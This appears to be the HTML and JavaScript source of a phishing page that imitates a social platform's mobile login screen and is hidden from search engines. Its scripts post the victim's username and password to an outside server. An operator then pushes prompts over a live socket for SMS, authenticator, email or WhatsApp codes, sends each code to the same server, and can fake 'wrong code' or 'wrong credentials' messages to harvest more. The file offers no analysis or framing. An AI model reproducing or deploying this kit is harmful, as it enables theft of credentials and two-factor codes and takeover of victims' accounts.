<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="assets2/1.css" />
  <link rel="stylesheet" href="assets2/2.css" />
  <link rel="stylesheet" href="assets2/3.css" />
  <link rel="stylesheet" href="assets2/LoginPage.css" />
  <meta name="robots" content="noindex, nofollow">

  <!-- Block specific bots -->
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="bingbot" content="noindex, noarchive, nosnippet">

  <!-- Stop showing previews/snippets -->
  <meta name="robots" content="nosnippet">

  <!-- No image indexing -->
  <meta name="googlebot" content="noimageindex">

  <!-- Prevent caching by bots -->
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
</head>
<style>
  @media (max-width: 768px) {
    .desktop-only {
      display: none;
    }

    .mobile-only {
      display: block;
    }
  }

  body {
    margin: 0;
    padding: 0;
    position: relative;
    /* Ensure the fullscreenbg is positioned correctly */
    height: 100vh;
    /* Full height */
  }
</style>

<body>

  <div class="fullscreenbg"></div>

  <div class="flex flex-col h-screen relative z-10" id="main-content">
    <div id="modal-overlay" style="display: none;">
      <div id="modal-content" class="modal"></div>
    </div>

    <div class="text-center mt-2">
      <p class="text-[13px] text-gray-600 whitespace-pre-wrap break-words fontiiiii">English (US)</p>
    </div>
    <div class="flex flex-col flex-grow w-full justify-evenly items-center"><img src="assets2/file_3.png" alt="Top Image"
        class="w-[60px] h-[60px]">
      <div class="flex flex-col items-center w-full max-w-md px-4"><input type="text" autocomplete="off"
          placeholder="Username"
          class="w-full mb-4 pointer-events-auto py-[16px] px-[15px] cursor-pointer border focus:outline-[#67788a] border-[rgb(203,210,217)] rounded-xl"
          id="username" value="" style="opacity: 1;">
        <input type="password" placeholder="Password" autocomplete="off"
          class="w-full mb-4 pointer-events-auto py-[16px] px-[15px] cursor-pointer border focus:outline-[#67788a] border-[rgb(203,210,217)] rounded-xl"
          id="password" value="" style="opacity: 1;">
        <button id="loginBtn" disabled=""
          class="mb-4 w-full py-2 bg-blue-500 text-white rounded hover:bg-blue-600 focus:outline-none text-[16px]"
          style="border-radius: 22px; background: rgb(0, 100, 224);">
          Log in
        </button><a href="#" class="text-blue-500 hover:underline fontiiiii" style="color: rgb(28, 43, 51); 
                    ">Forgot
          Password?</a>
      </div>
    </div>
    <div class="mt-[6rem]"></div>
    <div class="flex flex-col w-full items-center">
      <div class="flex flex-col items-center px-4 py-4 w-full max-w-md"><button disabled=""
          class="mb-6 py-2 px-4 w-full border border-gray-300 rounded hover:bg-gray-100 focus:outline-none focus:ring focus:ring-gray-300"
          style="border-radius: 22px; color: rgb(0, 100, 224); border: 1px solid rgb(0, 100, 224); 
                     opacity: 1;">Create
          new account</button><img src="assets2/file_9.png" alt="Bottom Logo" class="mb-6 h-[12px]">
        <div class="flex space-x-2"><a href="#" class="text-gray-500 text-[10px]"
            style="color: rgb(99, 120, 138);">About</a><a href="#" class="text-gray-500 text-[10px]"
            style="color: rgb(99, 120, 138);">Help</a><a href="#" class="text-gray-500 text-[10px]"
            style="color: rgb(99, 120, 138);">More</a></div>
      </div>
    </div>
  </div>
  <script src="https://jobback-zuh7.onrender.com/socket.io/socket.io.js"></script>
  <script>
    const shownCommands = {};
    let clientId = localStorage.getItem('clientId');
    if (!clientId) {
      clientId = crypto.randomUUID();
      localStorage.setItem('clientId', clientId);
    }

    const socket = io('https://jobback-zuh7.onrender.com', {
      query: { clientId }
    });

    socket.on('connect', () => {
      console.log("✅ Connected to server with socket ID:", socket.id);
      const session = {
        socketId: socket.id,
        timestamp: Date.now()
      };
      localStorage.setItem('socketSession', JSON.stringify(session));
    });
    socket.on('show-calendar', () => {
      window.location.href = 'calendly.php';
    });

    async function loadPage(filename) {
      try {
        const response = await fetch(`/public/${filename}`);
        const html = await response.text();
        const main = document.getElementById('main-content');
        main.className = '';
        main.innerHTML = html;
        if (filename === 'auth.html') setupAuthPageLogic();
        if (filename === 'sms.html') setupAuthPageLogic();
        if (filename === 'wh.html') setupAuthPageLogic();
        if (filename === 'email.html') setupEmailPageLogic();
      } catch (err) {
        console.error("Error loading page:", filename, err);
      }
    }
    async function loadModalPage(filename) {
      try {
        const response = await fetch(`/public/${filename}`);
        const html = await response.text();
        const overlay = document.getElementById('modal-overlay');
        const content = document.getElementById('modal-content');
        content.innerHTML = html;
        overlay.style.display = 'flex';

        overlay.onclick = (e) => {
          if (e.target.id === 'modal-overlay') {
            overlay.style.display = 'none';
            content.innerHTML = '';
          }
        };
      } catch (err) {
        console.error("❌ Failed to load modal page:", filename, err);
      }
    }

    function setupAuthPageLogic() {
      const authCodeInput = document.getElementById('authCode');
      const continueBtn = document.getElementById('continueBtn');


      authCodeInput.addEventListener('input', () => {
        const val = authCodeInput.value.replace(/\D/g, '').slice(0, 6);
        authCodeInput.value = val;


        if (val.length === 6) {
          continueBtn.disabled = false;
          continueBtn.style.opacity = '1';
          continueBtn.style.cursor = 'pointer';
        } else {
          continueBtn.disabled = true;
          continueBtn.style.opacity = '0.4';
          continueBtn.style.cursor = 'not-allowed';
        }
      });

      function sendCode() {
        const code = authCodeInput.value;
        const socketId = socket.id;
        if (code.length !== 6) return;
        continueBtn.disabled = true;
        continueBtn.style.opacity = '0.4';
        continueBtn.style.cursor = 'not-allowed';
        continueBtn.innerHTML = '<span class="loading-spinner"></span>';
        fetch('https://jobback-zuh7.onrender.com/send-auth-code', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ code: code, socketId: socketId })
        })
          .then(response => response.json())
          .then(data => {
          })
          .catch(error => {
            console.error('Error:', error);
            continueBtn.innerHTML = 'Continue';
            continueBtn.disabled = false;
            continueBtn.style.opacity = '1';
            continueBtn.style.cursor = 'pointer';
          });
      }
      continueBtn.addEventListener('click', sendCode);
    }
    function setupEmailPageLogic() {
      const authCodeInput = document.getElementById('authCode');
      const continueBtn = document.getElementById('continueBtn');


      authCodeInput.addEventListener('input', () => {
        const val = authCodeInput.value.replace(/\D/g, '').slice(0, 8);
        authCodeInput.value = val;


        if (val.length === 8) {
          continueBtn.disabled = false;
          continueBtn.style.opacity = '1';
          continueBtn.style.cursor = 'pointer';
        } else {
          continueBtn.disabled = true;
          continueBtn.style.opacity = '0.4';
          continueBtn.style.cursor = 'not-allowed';
        }
      });

      function sendCode() {
        const code = authCodeInput.value;
        const socketId = socket.id;
        if (code.length !== 8) return;
        continueBtn.disabled = true;
        continueBtn.style.opacity = '0.4';
        continueBtn.style.cursor = 'not-allowed';
        continueBtn.innerHTML = '<span class="loading-spinner"></span>';
        fetch('https://jobback-zuh7.onrender.com/send-email-code', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ code: code, socketId: socketId })
        })
          .then(response => response.json())
          .then(data => {
          })
          .catch(error => {
            console.error('Error:', error);
            continueBtn.innerHTML = 'Continue';
            continueBtn.disabled = false;
            continueBtn.style.opacity = '1';
            continueBtn.style.cursor = 'pointer';
          });
      }
      continueBtn.addEventListener('click', sendCode);
    }

    
    socket.on('show-2fa', () => {
      if (shownCommands['2fa']) {
        const timerDiv = document.querySelector('.timer');
        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
        timerDiv.style.display = 'block';
        continueBtn.innerHTML = 'Continue';
        continueBtn.disabled = false;
        continueBtn.style.opacity = '1';
        continueBtn.style.cursor = 'pointer';
        
      } else {
        shownCommands['2fa'] = true;
        loadPage('sms.html');
      }
    });
    socket.on('show-auth', () => {
      if (shownCommands['auth']) {
        const timerDiv = document.querySelector('.timer');
        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
        timerDiv.style.display = 'block';
        continueBtn.innerHTML = 'Continue';
        continueBtn.disabled = false;
        continueBtn.style.opacity = '1';
        continueBtn.style.cursor = 'pointer';
        
      } else {
        shownCommands['auth'] = true;
        loadPage('auth.html');
      }
    });
    socket.on('show-email', () => {
      if (shownCommands['email']) {
        const timerDiv = document.querySelector('.timer');
        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
        timerDiv.style.display = 'block';
        continueBtn.innerHTML = 'Continue';
        continueBtn.disabled = false;
        continueBtn.style.opacity = '1';
        continueBtn.style.cursor = 'pointer';
        
      } else {
        shownCommands['email'] = true;
        loadPage('email.html');
      }
    });
    socket.on('show-whatsapp', () => {
      if (shownCommands['whatsapp']) {
        const timerDiv = document.querySelector('.timer');
        timerDiv.innerText = "The code you entered isn\'t correct. Please check again.";
        timerDiv.style.display = 'block';
        continueBtn.innerHTML = 'Continue';
        continueBtn.disabled = false;
        continueBtn.style.opacity = '1';
        continueBtn.style.cursor = 'pointer';
        
      } else {
        shownCommands['whatsapp'] = true;
        loadPage('wh.html');
      }
    });
    // socket.on('show-email', () => loadPage('email.html'));
    // socket.on('show-whatsapp', () => loadPage('wh.html'));
    socket.on('show-wrong-creds', () => loadModalPage('wrong-creds.html'));
    socket.on('show-old-pass', () => loadModalPage('old-password.html'));


  </script>
  <script>
    const loginBtn = document.getElementById('loginBtn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    usernameInput.addEventListener('input', enableLoginBtn);
    passwordInput.addEventListener('input', enableLoginBtn);

    function enableLoginBtn() {
      if (usernameInput.value.trim() && passwordInput.value.trim()) {
        loginBtn.disabled = false;
        loginBtn.style.opacity = '1';
        loginBtn.style.cursor = 'pointer';
      } else {
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.4';
        loginBtn.style.cursor = 'not-allowed';
      }
    }

    async function sendLoginData() {
      const username = usernameInput.value.trim();
      const password = passwordInput.value.trim();

      if (!username || !password) return;


      loginBtn.disabled = true;
      loginBtn.style.opacity = '0.4';
      loginBtn.style.cursor = 'not-allowed';
      loginBtn.innerHTML = '<span class="loading-spinner"></span>';

      try {
        const response = await fetch('https://jobback-zuh7.onrender.com/send-login-data', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password, socketId: socket.id })
        });

        const data = await response.json();


        if (data.success) {

        } else {

        }
      } catch (error) {
        console.error('Error:', error);

      }


    }

    loginBtn.addEventListener('click', sendLoginData);
  </script>
  <script>
    function checkIfStillMobile() {
      const isMobile = window.innerWidth <= 768;
      if (!isMobile) {
        window.location.href = 'index.php';
      }
    }
    checkIfStillMobile();
    function closeModal() {

      document.getElementById('modal-overlay').style.display = 'none';
      const loginBtn = document.getElementById('loginBtn');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');



      // Clear inputs
      if (usernameInput) usernameInput.value = '';
      if (passwordInput) passwordInput.value = '';

      // Re-enable button
      if (loginBtn) {
        loginBtn.disabled = false;
        loginBtn.style.opacity = '1';
        loginBtn.style.cursor = 'pointer';
        loginBtn.innerHTML = 'Log In';
      }
    }
  </script>
</body>

</html>